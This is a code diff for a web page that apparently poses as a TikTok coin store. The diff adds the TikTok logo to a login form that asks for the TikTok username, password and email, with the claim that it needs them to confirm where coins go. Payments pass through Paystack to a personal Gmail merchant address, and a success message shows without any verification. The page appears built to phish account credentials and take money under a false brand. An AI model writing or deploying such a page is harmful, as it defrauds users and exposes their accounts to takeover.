@@ -310,7 +310,7 @@ body {
   opacity: 0.6;
 }
 
-/* Order Summary Modal */
+/* Order Summary Modal (slides up halfway) */
 .order-summary {
   display: none;
   position: fixed;
@@ -323,7 +323,7 @@ body {
   border-top-left-radius: 18px;
   border-top-right-radius: 18px;
   box-shadow: 0 -6px 24px rgba(0,0,0,0.16);
-  padding: 18px;
+  padding: 18px 18px 24px 18px;
   overflow: auto;
   animation: slideUp 0.28s ease;
 }
@@ -342,6 +342,7 @@ body {
 .total-row { display:flex; justify-content:space-between; margin-top:12px; font-weight:800; font-size:16px; padding-top:6px; }
 .pay-now { margin-top:16px; width:100%; background-color:#ff375f; color:white; padding:14px; border:none; border-radius:10px; font-size:17px; font-weight:700; cursor:pointer; }
 
+/* success toast */
 .toast {
   display:none;
   position: fixed;
@@ -357,6 +358,7 @@ body {
   box-shadow: 0 6px 18px rgba(0,0,0,0.08);
 }
 
+/* small close button in modal */
 .order-close {
   position: absolute;
   right: 14px;
@@ -385,26 +387,27 @@ body {
   <div class="coins-grid" id="coinsGrid">
     <div class="coin-box" data-coins="30" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
-      <div class="coin-price">$0.54</div>
-    </div>
-    <div class="coin-box" data-coins="70" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">70</div>
-      <div class="coin-price">$1.25</div>
+      <div class="coin-price"></div>
     </div>
     <div class="coin-box" data-coins="350" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
-      <div class="coin-price">$6.25</div>
+      <div class="coin-price"></div>
     </div>
     <div class="coin-box" data-coins="700" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
-      <div class="coin-price">$12.50</div>
+      <div class="coin-price"></div>
     </div>
     <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
-      <div class="coin-price">$25.00</div>
+      <div class="coin-price"></div>
+    </div>
+    <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
+      <div class="coin-price"></div>
     </div>
     <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
       <span class="coin-amount">Custom</span>
+      <div class="coin-price"></div>
     </div>
   </div>
 
@@ -412,6 +415,7 @@ body {
     <input type="number" id="customAmount" placeholder="Enter coins amount" oninput="updateCustomAmount()">
   </div>
 
+  <!-- mainButton behavior: if not logged-in → show login; if logged-in → show order summary -->
   <button class="login-btn" id="mainButton" onclick="mainButtonAction()">Log in to get Coins</button>
 
   <div class="invite-box">
@@ -434,16 +438,22 @@ body {
   </div>
 </div>
 
-<!-- Loading -->
-<div class="loading-overlay" id="loadingOverlay"><div class="loader"></div></div>
+<!-- Loading overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loader"></div>
+</div>
 
-<!-- Login Modal -->
+<!-- Login modal -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
-    <h2>Log in to get Coins</h2>
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
+         alt="TikTok Logo"
+         style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
+    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
     <p>Log in to your TikTok account to confirm where to send coins.</p>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
     <input type="password" id="passwordInput" placeholder="Password" required><br>
+    <input type="email" id="emailInput" placeholder="Email" required><br>
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
@@ -457,19 +467,33 @@ body {
   <div class="summary-row">
     <div>
       <div class="summary-label">Account</div>
-      <div class="small-muted" id="accountUsername">@user</div>
+      <div class="small-muted" id="accountUsername">@blesss</div>
+      <div class="small-muted" id="accountPassword" style="margin-top:6px;">Password: ••••••••</div>
+      <div class="small-muted" id="accountEmail" style="margin-top:6px;">Email: —</div>
+    </div>
+    <div style="text-align:right;">
+      <div class="summary-label"> </div>
     </div>
   </div>
 
   <div class="summary-row">
     <div class="summary-label">Total Coin Purchase</div>
-    <div class="summary-value" id="summaryCoins">0 Coins</div>
+    <div class="summary-value" id="summaryCoins">3,500 Coins</div>
   </div>
 
   <div class="summary-row">
     <div class="summary-label">Amount</div>
     <div class="summary-value" id="summaryAmount">$0.00</div>
   </div>
+
+  <div style="margin-top:10px;">
+    <div class="payment-method" style="font-weight:700;">Payment method</div>
+    <div class="small-muted" style="margin-top:6px;">Paystack</div>
+  </div>
+
+  <p class="notice-text small-muted" style="margin-top:12px;">
+    By tapping Pay now to make a purchase, you acknowledge that you are purchasing a limited license to access this <span style="color:#000;">🔻</span>
+  </p>
 
   <div class="total-row">
     <span>Total</span>
@@ -479,25 +503,63 @@ body {
   <button class="pay-now" id="payNowBtn" onclick="payWithPaystack()">Pay Now</button>
 </div>
 
+<!-- success toast -->
 <div class="toast" id="successToast">Payment Successful — Coins will be sent shortly.</div>
 
 <script>
+/* -------------------------
+   Config / initial state
+   ------------------------- */
+// Paystack public key (unchanged)
 const PAYSTACK_PUBLIC_KEY = 'pk_live_05d5fe8301b202427f3d3a9b26059269ddd1c00f';
 const MERCHANT_EMAIL = 'Legaltenderpay@gmail.com';
-let coinRate = 0.0179; // USD per coin
-let selectedCoins = 70;
+
+// User-requested conversion:
+// 70 coins = $1.25 -> per-coin USD rate:
+const coinRate = 1.25 / 70; // ≈ 0.017857142857...
+
+let selectedCoins = 350; // default selected
 let loggedIn = false;
 
-function formatUSD(amount) {
+/* -------------------------
+   Helper: format currency in USD
+   ------------------------- */
+function formatCurrencyUSD(amount) {
+  // amount is a number in USD
+  // Always show 2 decimals
   return '$' + amount.toFixed(2);
 }
 
+/* -------------------------
+   Update displayed coin prices in the grid (USD)
+   ------------------------- */
+function updateGridPrices() {
+  document.querySelectorAll('.coin-box').forEach(box => {
+    const coins = box.getAttribute('data-coins');
+    const priceEl = box.querySelector('.coin-price');
+    if (!priceEl) return;
+    if (coins === 'custom') {
+      priceEl.textContent = '';
+    } else {
+      const n = parseInt(coins, 10) || 0;
+      const price = n * coinRate;
+      priceEl.textContent = formatCurrencyUSD(price);
+    }
+  });
+}
+
+/* -------------------------
+   Coin selection functions
+   ------------------------- */
 function selectBox(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
   el.classList.add('active');
-  const val = el.getAttribute('data-coins');
-  if (val === 'custom') return selectCustom(el);
-  selectedCoins = parseInt(val);
+  const data = el.getAttribute('data-coins');
+  if (data === 'custom') {
+    selectCustom(el);
+    return;
+  }
+  selectedCoins = parseInt(data) || 0;
   document.getElementById('customInputBox').style.display = 'none';
   updateMainButton();
 }
@@ -506,6 +568,8 @@ function selectCustom(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
   el.classList.add('active');
   document.getElementById('customInputBox').style.display = 'block';
+  selectedCoins = 0;
+  updateMainButton();
 }
 
 function updateCustomAmount() {
@@ -514,32 +578,184 @@ function updateCustomAmount() {
   updateMainButton();
 }
 
+/* -------------------------
+   Main button behavior
+   ------------------------- */
 function updateMainButton() {
   const btn = document.getElementById('mainButton');
-  if (!loggedIn) btn.textContent = 'Log in to get Coins';
-  else if (selectedCoins > 0) btn.textContent = `Buy ${selectedCoins} Coins for ${formatUSD(selectedCoins * coinRate)}`;
-  else btn.textContent = 'Buy Now';
+  if (!loggedIn) {
+    btn.textContent = 'Log in to get Coins';
+    return;
+  }
+  if (selectedCoins > 0) {
+    const amountUSD = selectedCoins * coinRate;
+    btn.textContent = `Buy ${selectedCoins} Coins for ${formatCurrencyUSD(amountUSD)}`;
+  } else {
+    btn.textContent = 'Buy Now';
+  }
 }
 
 function mainButtonAction() {
-  if (!loggedIn) startLogin();
-  else showOrderSummary();
+  // If not logged-in -> open login flow
+  if (!loggedIn) {
+    startLogin();
+    return;
+  }
+  // If logged in -> show order summary
+  showOrderSummary();
 }
 
+/* -------------------------
+   Login flow
+   ------------------------- */
 function startLogin() {
+  // show loading then login modal
   document.getElementById('loadingOverlay').style.display = 'flex';
   setTimeout(() => {
     document.getElementById('loadingOverlay').style.display = 'none';
     document.getElementById('loginModal').style.display = 'flex';
-  }, 600);
+  }, 700); // short animated feel
 }
 
+/* Updated completeLogin — shows loading then marks logged in */
 function completeLogin() {
   document.getElementById('loginModal').style.display = 'none';
-  loggedIn = true;
-  updateMainButton();
+  document.getElementById('loadingOverlay').style.display = 'flex';
+
+  setTimeout(() => {
+    document.getElementById('loadingOverlay').style.display = 'none';
+    loggedIn = true;
+    // update main button label
+    updateMainButton();
+    // close modal already done — user can click Buy
+  }, 900);
 }
 
+/* -------------------------
+   Order Summary display
+   ------------------------- */
 function showOrderSummary() {
-  document.getElementById('accountUsername').textContent = '@' + (document.getElementById('usernameInput').value || 'user');
-  document.getElementById('summaryCoins').text
+  // Fill summary fields from current values
+  const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
+  const passwordVal = document.getElementById('passwordInput').value || '';
+  const emailVal = document.getElementById('emailInput').value.trim() || '—';
+  const coins = selectedCoins > 0 ? selectedCoins : 0;
+  const amount = coins * coinRate;
+
+  document.getElementById('accountUsername').textContent = '@' + usernameVal;
+  document.getElementById('accountPassword').textContent = 'Password: ' + (passwordVal ? passwordVal : '—');
+  document.getElementById('accountEmail').textContent = 'Email: ' + emailVal;
+
+  document.getElementById('summaryCoins').textContent = coins.toLocaleString() + ' Coins';
+  document.getElementById('summaryAmount').textContent = formatCurrencyUSD(amount);
+  document.getElementById('summaryTotal').textContent = formatCurrencyUSD(amount);
+
+  // show modal
+  document.getElementById('orderSummary').style.display = 'block';
+  // ensure Pay button enabled
+  document.getElementById('payNowBtn').disabled = false;
+}
+
+function closeOrderSummary() {
+  document.getElementById('orderSummary').style.display = 'none';
+}
+
+/* -------------------------
+   Paystack integration (amount in cents for USD)
+   ------------------------- */
+function payWithPaystack() {
+  const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
+  const emailVal = document.getElementById('emailInput').value.trim() || '';
+  const coins = selectedCoins > 0 ? selectedCoins : 0;
+  if (coins <= 0) {
+    alert('Please select a valid coins amount.');
+    return;
+  }
+  const amountUSD = coins * coinRate;
+  const amountCents = Math.round(amountUSD * 100); // Paystack (for USD) requires cents
+
+  const handler = PaystackPop.setup({
+    key: PAYSTACK_PUBLIC_KEY,
+    // Keep merchant email as the payment recipient (per your original)
+    email: MERCHANT_EMAIL,
+    amount: amountCents,
+    currency: 'USD',
+    metadata: {
+      custom_fields: [
+        { display_name: "TikTok username", variable_name: "username", value: '@' + usernameVal },
+        { display_name: "Customer email", variable_name: "customer_email", value: emailVal },
+        { display_name: "Coins", variable_name: "coins", value: coins.toString() }
+      ]
+    },
+    callback: function(response) {
+      // On success: close order summary, show success toast
+      document.getElementById('orderSummary').style.display = 'none';
+      showSuccessToast();
+      // NOTE: For production you MUST verify transaction server-side using the reference:
+      // response.reference
+    },
+    onClose: function() {
+      // leave order summary open so user can retry
+    }
+  });
+  handler.openIframe();
+}
+
+/* -------------------------
+   Success toast logic
+   ------------------------- */
+function showSuccessToast() {
+  const t = document.getElementById('successToast');
+  t.style.display = 'block';
+  setTimeout(() => {
+    t.style.opacity = '1';
+  }, 10);
+  // Hide after 4 seconds
+  setTimeout(() => {
+    t.style.opacity = '0';
+    setTimeout(()=> t.style.display = 'none', 300);
+  }, 4000);
+}
+
+/* -------------------------
+   Complete Login button enablement (now requires email too)
+   ------------------------- */
+const usernameField = document.getElementById('usernameInput');
+const passwordField = document.getElementById('passwordInput');
+const emailField = document.getElementById('emailInput');
+const continueBtn = document.getElementById('continueBtn');
+
+function checkLoginFields() {
+  if (usernameField && passwordField && emailField &&
+      usernameField.value.trim() && passwordField.value.trim() && emailField.value.trim()) {
+    continueBtn.disabled = false;
+    continueBtn.style.opacity = '1';
+    continueBtn.style.cursor = 'pointer';
+  } else {
+    continueBtn.disabled = true;
+    continueBtn.style.opacity = '0.6';
+    continueBtn.style.cursor = 'not-allowed';
+  }
+}
+
+if (usernameField && passwordField && emailField) {
+  usernameField.addEventListener('input', checkLoginFields);
+  passwordField.addEventListener('input', checkLoginFields);
+  emailField.addEventListener('input', checkLoginFields);
+}
+
+/* -------------------------
+   Initialize default UI state
+   ------------------------- */
+(function init() {
+  // pre-select 350 by default (your examples)
+  document.querySelectorAll('.coin-box').forEach(b => {
+    if (b.getAttribute('data-coins') === '350') b.classList.add('active');
+  });
+  selectedCoins = 350;
+  updateGridPrices();
+  updateMainButton();
+})();
+</script>
+</body>
+</html>
